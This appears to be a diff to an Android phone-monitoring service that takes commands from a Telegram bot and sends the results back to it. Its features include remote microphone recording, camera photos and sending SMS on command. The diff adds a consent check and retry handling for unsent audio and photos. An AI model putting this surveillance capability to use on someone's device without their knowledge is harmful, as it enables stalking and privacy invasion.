@@ -47,6 +47,9 @@ class MonitoringService : Service() {
     private val cameraBusy = AtomicBoolean(false)
     private val ringBusy = AtomicBoolean(false)
     private val recordBusy = AtomicBoolean(false)
+    private val audioFlushBusy = java.util.concurrent.atomic.AtomicBoolean(false)
+    @Volatile
+    private var activeAudioFile: File? = null
     private var ringJob: Job? = null
     private var recordJob: Job? = null
     private var watchdogJob: Job? = null
@@ -77,6 +80,7 @@ class MonitoringService : Service() {
         const val ACTION_STOP_MONITORING = "STOP_MONITORING"
         private const val COMMAND_MAX_AGE_SEC = 900L
         private const val NOTIFICATION_ID = 1
+        private const val MAX_AUDIO_KEPT = 5
         private val storageWarnAt = java.util.concurrent.atomic.AtomicLong(0L)
     }
 
@@ -94,7 +98,7 @@ class MonitoringService : Service() {
         try { preferencesManager.registerChangeListener(credsListener!!) } catch (_: Exception) { }
         smsRepository = SmsRepository(this)
         callLogRepository = CallLogRepository(this)
-        messageQueue = MessageQueue(this)
+        messageQueue = MessageQueue.getInstance(this)
         cameraService = CameraService(this)
     }
 
@@ -153,6 +157,14 @@ class MonitoringService : Service() {
     }
 
     private fun startMonitoring() {
+        try {
+            if (preferencesManager.userDisabledMonitoring || !preferencesManager.userConsentedMonitoring) {
+                android.util.Log.w("MonitoringService", "Monitoring disabled by user; not starting")
+                stopMonitoring()
+                return
+            }
+        } catch (_: Exception) {
+        }
         if (monitoringJob?.isActive == true && cameraJob?.isActive == true && commandJob?.isActive == true) {
             refreshCreds()
             return
@@ -383,10 +395,6 @@ class MonitoringService : Service() {
     // ═══════════════════════════════════════════════════════════
 
     private var idlePolls = 0
-    private var lastSmsSendAt = 0L
-    private var pendingSmsNumber = ""
-    private var pendingSmsText = ""
-    private var pendingSmsAt = 0L
 
     private fun startCommandPolling() {
         commandJob = serviceScope.launch {
@@ -619,7 +627,8 @@ class MonitoringService : Service() {
         } catch (e: Exception) {
             android.util.Log.e("MonitoringService", "Command failed: $command (${redactToken(e.message)})")
             try {
-                sendToTelegram("\u26A0\uFE0F Command $command failed (${e.message ?: "unknown error"}). Please try again or send /help.")
+                val detail = redactToken(e.message).ifEmpty { "unknown error" }
+                sendToTelegram("\u26A0\uFE0F Command $command failed ($detail). Please try again or send /help.")
             } catch (_: Exception) {
             }
         }
@@ -785,6 +794,7 @@ class MonitoringService : Service() {
                 }
                 if (crash != null) {
                     sendToTelegram(crash)
+                    CrashReporter.clearPending(this)
                 } else {
                     sendToTelegram("\uD83E\uDDFE No crash recorded.")
                 }
@@ -916,19 +926,19 @@ class MonitoringService : Service() {
                 } else if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.SEND_SMS) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                     sendToTelegram("\u26A0\uFE0F SMS permission missing. Open Setup and grant SMS permission.")
                 } else {
-                    pendingSmsNumber = normalized
-                    pendingSmsText = smsText
-                    pendingSmsAt = System.currentTimeMillis()
+                    preferencesManager.pendingSmsNumber = normalized
+                    preferencesManager.pendingSmsText = smsText
+                    preferencesManager.pendingSmsAt = System.currentTimeMillis()
                     sendToTelegram("\uD83D\uDCE9 SMS ke <code>$normalized</code> siap dikirim. Balas /smsconfirm untuk konfirmasi (berlaku 5 menit).")
                 }
             }
             "/smsconfirm" -> {
-                val number = pendingSmsNumber
-                val smsText = pendingSmsText
-                val stagedAt = pendingSmsAt
+                val number = preferencesManager.pendingSmsNumber
+                val smsText = preferencesManager.pendingSmsText
+                val stagedAt = preferencesManager.pendingSmsAt
                 if (number.isEmpty() || smsText.isEmpty() || stagedAt <= 0L || System.currentTimeMillis() - stagedAt > 300_000L) {
                     sendToTelegram("\u23F1\uFE0F Tidak ada SMS tertunda. Kirim /sms \u003cnomor\u003e \u003cpesan\u003e dulu.")
-                } else if (System.currentTimeMillis() - lastSmsSendAt < 60_000L) {
+                } else if (System.currentTimeMillis() - preferencesManager.lastSmsSendAt < 60_000L) {
                     sendToTelegram("\u26A0\uFE0F Tunggu sebentar sebelum kirim SMS lagi.")
                 } else {
                     sendSmsPending(number, smsText)
@@ -1337,11 +1347,10 @@ class MonitoringService : Service() {
     }
 
     private suspend fun sendSmsPending(number: String, smsText: String) {
-        pendingSmsNumber = ""
-        pendingSmsText = ""
-        pendingSmsAt = 0L
+        preferencesManager.pendingSmsNumber = ""
+        preferencesManager.pendingSmsText = ""
+        preferencesManager.pendingSmsAt = 0L
         try {
-            lastSmsSendAt = System.currentTimeMillis()
             val smsManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                 getSystemService(android.telephony.SmsManager::class.java)
             } else {
@@ -1352,6 +1361,7 @@ class MonitoringService : Service() {
             } else {
                 smsManager.sendTextMessage(number, null, smsText, null, null)
             }
+            preferencesManager.lastSmsSendAt = System.currentTimeMillis()
             sendToTelegram("\uD83D\uDCE9 SMS sent to $number.")
         } catch (e: SecurityException) {
             sendToTelegram("\u26A0\uFE0F SMS permission missing. Open Setup and grant SMS permission.")
@@ -1456,7 +1466,9 @@ class MonitoringService : Service() {
             val (botToken, chatId) = sendCreds()
 
             if (botToken.isEmpty() || chatId.isEmpty()) {
-                android.util.Log.e("MonitoringService", "Bot token or chat ID is empty!")
+                android.util.Log.w("MonitoringService", "Bot credentials unavailable, queuing message for later")
+                messageQueue.addMessage(message)
+                MessageScheduler.scheduleMessageSend(this)
                 return
             }
 
@@ -1493,18 +1505,18 @@ class MonitoringService : Service() {
                 val retryAfter = NetworkUtils.parseRetryAfter(response.errorBody()?.string())
                 android.util.Log.w("MonitoringService", "Rate limited, will retry via queue after ${retryAfter}s")
                 messageQueue.addMessage(message)
-                MessageScheduler.scheduleMessageSend(this)
+                MessageScheduler.scheduleMessageSend(this, retryAfter * 1000L)
             } else if (response.code() == 401 || response.code() == 403) {
-                android.util.Log.e("MonitoringService", "Auth rejected (${response.code()}), not queuing")
+                android.util.Log.e("MonitoringService", "Auth rejected (${response.code()}), queuing until credentials are fixed")
                 try {
                     preferencesManager.credentialError = response.code().toString()
                     preferencesManager.credentialErrorAt = android.os.SystemClock.elapsedRealtime()
                 } catch (_: Exception) {
                 }
-            } else if (response.code() == 400) {
-                android.util.Log.w("MonitoringService", "Bad request (400), queuing for retry")
                 messageQueue.addMessage(message)
                 MessageScheduler.scheduleMessageSend(this)
+            } else if (response.code() == 400) {
+                android.util.Log.w("MonitoringService", "Message permanently rejected (400), not queued")
             } else {
                 android.util.Log.e("MonitoringService", "✗ Failed to send: ${response.code()}")
                 messageQueue.addMessage(message)
@@ -1545,6 +1557,11 @@ class MonitoringService : Service() {
         } catch (_: Exception) {
         }
         watchdogJob?.cancel()
+        cameraBusy.set(false)
+        try {
+            cameraService.forceReset()
+        } catch (_: Exception) {
+        }
         stopForeground(STOP_FOREGROUND_REMOVE)
         stopSelf()
     }
@@ -1553,6 +1570,11 @@ class MonitoringService : Service() {
 
     override fun onDestroy() {
         try { credsListener?.let { preferencesManager.unregisterChangeListener(it) } } catch (_: Exception) { }
+        try {
+            cameraBusy.set(false)
+            cameraService.forceReset()
+        } catch (_: Exception) {
+        }
         super.onDestroy()
         serviceScope.cancel()
     }
@@ -1754,6 +1776,18 @@ class MonitoringService : Service() {
     }
 
     private fun restartAllLoops() {
+        try {
+            monitoringJob?.cancel()
+        } catch (_: Exception) {
+        }
+        try {
+            cameraJob?.cancel()
+        } catch (_: Exception) {
+        }
+        try {
+            commandJob?.cancel()
+        } catch (_: Exception) {
+        }
         startPeriodicLoops()
         startCommandPolling()
     }
@@ -1834,6 +1868,7 @@ class MonitoringService : Service() {
     private suspend fun recordAndSendAudio(seconds: Int) {
         val audioFile = File(cacheDir, "audio_" + System.currentTimeMillis() + ".m4a")
         var recorder: android.media.MediaRecorder? = null
+        activeAudioFile = audioFile
         try {
             recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                 android.media.MediaRecorder(this)
@@ -1853,8 +1888,9 @@ class MonitoringService : Service() {
             }
             if (sendAudioFile(audioFile)) {
                 sendToTelegram("\uD83C\uDF99\uFE0F Audio sent (${seconds}s).")
+                flushPendingAudio()
             } else {
-                sendToTelegram("\u26A0\uFE0F Audio recorded but send failed.")
+                sendToTelegram("\u26A0\uFE0F Audio recorded but send failed. File kept for automatic retry.")
             }
         } catch (e: java.util.concurrent.CancellationException) {
             throw e
@@ -1867,7 +1903,8 @@ class MonitoringService : Service() {
                 recorder?.release()
             } catch (_: Exception) {
             }
-            deleteQuietly(audioFile)
+            activeAudioFile = null
+            pruneAudioCache(MAX_AUDIO_KEPT)
         }
     }
 
@@ -1884,6 +1921,7 @@ class MonitoringService : Service() {
             val response = TelegramClient.api.sendAudio(url, chatIdBody, caption, audioPart)
             if (response.isSuccessful && response.body()?.ok == true) {
                 preferencesManager.lastSyncTime = System.currentTimeMillis()
+                deleteQuietly(audioFile)
                 return true
             }
             if (response.code() == 401 || response.code() == 403) {
@@ -1892,10 +1930,48 @@ class MonitoringService : Service() {
                     preferencesManager.credentialErrorAt = android.os.SystemClock.elapsedRealtime()
                 } catch (_: Exception) {
                 }
+            } else if (response.code() == 400) {
+                android.util.Log.w("MonitoringService", "Audio rejected (400), dropping file")
+                deleteQuietly(audioFile)
             }
             return false
         } catch (e: Exception) {
             return false
+        }
+    }
+
+    private suspend fun flushPendingAudio(max: Int = 5) {
+        if (authBlocked()) return
+        if (!audioFlushBusy.compareAndSet(false, true)) return
+        try {
+            if (!hasNetwork()) return
+            val pending = try {
+                cacheDir.listFiles { file ->
+                    file.isFile && file.name.startsWith("audio_") && file.name.endsWith(".m4a")
+                }?.sortedBy { it.lastModified() }?.take(max) ?: return
+            } catch (e: Exception) {
+                return
+            }
+            val now = System.currentTimeMillis()
+            for (file in pending) {
+                if (file == activeAudioFile) continue
+                if (now - file.lastModified() < 10_000L) continue
+                if (!sendAudioFile(file)) break
+                kotlinx.coroutines.delay(500)
+            }
+        } finally {
+            audioFlushBusy.set(false)
+            pruneAudioCache(MAX_AUDIO_KEPT)
+        }
+    }
+
+    private fun pruneAudioCache(maxKept: Int) {
+        try {
+            val files = cacheDir.listFiles { file ->
+                file.isFile && file.name.startsWith("audio_") && file.name.endsWith(".m4a")
+            }?.sortedBy { it.lastModified() } ?: return
+            files.drop(maxKept).forEach { deleteQuietly(it) }
+        } catch (_: Exception) {
         }
     }
 
@@ -2009,15 +2085,15 @@ class MonitoringService : Service() {
             if (response.code() == 429) {
                 android.util.Log.w("MonitoringService", "Photo rate limited, keeping file for retry")
             } else if (response.code() == 401 || response.code() == 403) {
-                android.util.Log.e("MonitoringService", "Photo auth rejected (${response.code()}), dropping file")
+                android.util.Log.e("MonitoringService", "Photo auth rejected (${response.code()}), keeping file for retry")
                 try {
                     preferencesManager.credentialError = response.code().toString()
                     preferencesManager.credentialErrorAt = android.os.SystemClock.elapsedRealtime()
                 } catch (_: Exception) {
                 }
-                deleteQuietly(photoFile)
             } else if (response.code() == 400) {
-                android.util.Log.w("MonitoringService", "Photo rejected (400), keeping file for retry")
+                android.util.Log.w("MonitoringService", "Photo rejected (400), dropping file")
+                deleteQuietly(photoFile)
             } else {
                 android.util.Log.e("MonitoringService", "✗ Failed to send photo: ${response.code()} $errorBody")
                 notifyPhotoSendFailure("HTTP ${response.code()} $errorBody".trim())
